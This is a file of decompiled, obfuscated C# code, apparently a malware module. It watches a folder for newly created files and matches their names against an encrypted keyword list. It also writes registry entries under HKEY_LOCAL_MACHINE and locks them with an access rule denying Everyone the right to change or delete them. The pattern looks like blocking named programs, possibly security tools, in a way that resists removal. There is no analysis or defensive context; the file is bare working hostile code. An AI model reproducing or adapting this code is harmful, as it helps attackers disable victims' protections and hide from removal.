using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

[StandardModule]
internal sealed class ____________________________________________________________
{
	[AccessedThroughProperty("SystemShield")]
	private static FileSystemWatcher m__;

	public static string __;

	public static string ___;

	public static FileSystemWatcher _
	{
		get
		{
			return ____________________________________________________________.m__;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			FileSystemEventHandler value2 = _______;
			if (____________________________________________________________.m__ != null)
			{
				____________________________________________________________.m__.Created -= value2;
			}
			____________________________________________________________.m__ = value;
			if (____________________________________________________________.m__ != null)
			{
				____________________________________________________________.m__.Created += value2;
			}
		}
	} = new FileSystemWatcher();


	unsafe static ____________________________________________________________()
	{
		nint num = (nint)Type.EmptyTypes.LongLength + 35646;
		int num2 = _003CModule_003E.______________;
		____________________________________________________________.___ = _003CModule_003E.__________((int)num, (int)((((uint)num2 % 32768u - 8859) * 64 - 191424 != (uint)(~(num2 * 606656))) ? ((nint)Type.EmptyTypes.LongLength + 35488) : ((1879048192 + 1073741824 * num2 == (int)((uint)num2 >> 29)) ? ((nint)Type.EmptyTypes.LongLength + 767672879) : (sizeof(Guid) + -1581283094))), 157);
	}

	public static void ___(string string_0)
	{
		try
		{
			if (_____(string_0))
			{
				_________________________________________________.___________(string_0.ToString());
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void ____(string string_0)
	{
		try
		{
			string[] directories = Directory.GetDirectories(string_0);
			string[] array = directories;
			foreach (string string_ in array)
			{
				try
				{
					if (_____(string_))
					{
						_________________________________________________.___________(string_);
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	public unsafe static bool _____(string string_0)
	{
		try
		{
			string[] array = default(string[]);
			if (Operators.CompareString(____________________________________________________________.___, _003CModule_003E.__________((int)((nint)Type.EmptyTypes.LongLength + 4122), (int)((nint)Type.EmptyTypes.LongLength + 6121), (int)((nint)Type.EmptyTypes.LongLength + 46)), false) == 0)
			{
				int num = -25394;
				if (sizeof(long) + -24915 != 25022)
				{
					return false;
				}
			}
			else
			{
				array = Strings.Split(____________________________________________________________.___, _003CModule_003E._____<string>(2815274875u), -1, (CompareMethod)0);
				int num = default(int);
				if (((uint)(num * 4096) ^ 0x1624u) != 0 && ((uint)(-(num * 8192)) ^ 0x196Bu) != 0)
				{
					int num2 = default(int);
					switch ((~(6510 + (uint)num2 / 381234u) == 9304) ? (sizeof(uint) + 1850919753) : (sizeof(long) + -8))
					{
					}
				}
			}
			string text = Strings.StrConv(string_0.ToString(), (VbStrConv)2, 0);
			string[] array2 = array;
			foreach (string text2 in array2)
			{
				try
				{
					if (Operators.CompareString(text2, _003CModule_003E.__________((int)((nint)Type.EmptyTypes.LongLength + 47130), (int)((nint)Type.EmptyTypes.LongLength + 49350), 134), false) != 0 && text.Contains(text2))
					{
						return true;
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			return false;
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static void ______()
	{
		try
		{
			____________________________________________________________.___ = __________________________________________________________________.____(_003CModule_003E.___<string>(2987481260u));
			_.Filter = _003CModule_003E.___<string>(4008727444u);
			_.NotifyFilter = NotifyFilters.FileName;
			_.Path = Environment.GetEnvironmentVariable(_003CModule_003E._______<string>(404507950u)) + _003CModule_003E.____<string>(2151898393u);
			_.IncludeSubdirectories = true;
			_.EnableRaisingEvents = true;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private static void _______(object sender, FileSystemEventArgs e)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					break;
				case 50:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 3:
							goto end_IL_0000_3;
						}
						goto default;
					}
					end_IL_0000_2:
					break;
				}
				num = 2;
				___(e.FullPath);
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 50;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public unsafe static void ________(string string_0)
	{
		try
		{
			int num2 = default(int);
			RegistryKey registryKey = default(RegistryKey);
			RegistryKey registryKey2 = default(RegistryKey);
			SecurityIdentifier securityIdentifier = default(SecurityIdentifier);
			string identity = default(string);
			while (___________________________________________________________________.________())
			{
				int num;
				nint num3;
				if (string_0.Contains(_003CModule_003E.___<string>(3175546013u)))
				{
					if (string_0.Contains(_003CModule_003E._____<string>(305124521u)))
					{
						string_0 = Path.GetFileName(string_0);
						num = 9409;
						if (((num2 - 862) & 1) != (1 & num2))
						{
							continue;
						}
					}
					registryKey = Registry.LocalMachine.OpenSubKey(_003CModule_003E._______<string>(4102994385u), writable: true);
					registryKey.CreateSubKey(string_0);
					num = (int)((nint)Type.EmptyTypes.LongLength + 243);
					num3 = (nint)Type.EmptyTypes.LongLength + 0;
					goto IL_017a;
				}
				num = 6561;
				if (2198 != 17450)
				{
					break;
				}
				goto IL_019a;
				IL_017a:
				while (true)
				{
					switch (num3)
					{
					default:
						do
						{
							registryKey.Close();
							registryKey2 = Registry.LocalMachine.OpenSubKey(_003CModule_003E._____<string>(1224194589u) + string_0, writable: true);
							if (num == 243)
							{
								registryKey2.SetValue(_003CModule_003E.______<string>(97836900u), _003CModule_003E._______<string>(1744436544u));
								securityIdentifier = new SecurityIdentifier(WellKnownSidType.WorldSid, null);
								continue;
							}
							return;
						}
						while ((((int)((uint)num / 517070u) - 8388608 * num) ^ 0x8F56) == 0);
						if ((-5238 | (num * -188743680)) == -5238)
						{
							if ((0x800000 & ((uint)num >> 9)) == (uint)((num - (num - 3954) << 23) & 0x800000))
							{
								break;
							}
							num3 = sizeof(long) + 1608578384;
							continue;
						}
						num3 = (nint)Type.EmptyTypes.LongLength + -1825220696;
						continue;
					case 2:
						break;
					case 1:
					{
						RegistrySecurity registrySecurity = new RegistrySecurity();
						registrySecurity.AddAccessRule(new RegistryAccessRule(identity, RegistryRights.ExecuteKey, InheritanceFlags.None, PropagationFlags.None, AccessControlType.Allow));
						registrySecurity.AddAccessRule(new RegistryAccessRule(identity, RegistryRights.SetValue | RegistryRights.CreateSubKey | RegistryRights.Delete | RegistryRights.ChangePermissions | RegistryRights.TakeOwnership, InheritanceFlags.None, PropagationFlags.None, AccessControlType.Deny));
						registryKey2.SetAccessControl(registrySecurity);
						registryKey2.Close();
						return;
					}
					}
					break;
				}
				goto IL_019a;
				IL_019a:
				NTAccount nTAccount = securityIdentifier.Translate(typeof(NTAccount)) as NTAccount;
				identity = nTAccount.ToString();
				num3 = (((uint)num / 32u != 1796913459) ? ((nint)Type.EmptyTypes.LongLength + 1) : ((nint)Type.EmptyTypes.LongLength + 393597365));
				goto IL_017a;
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
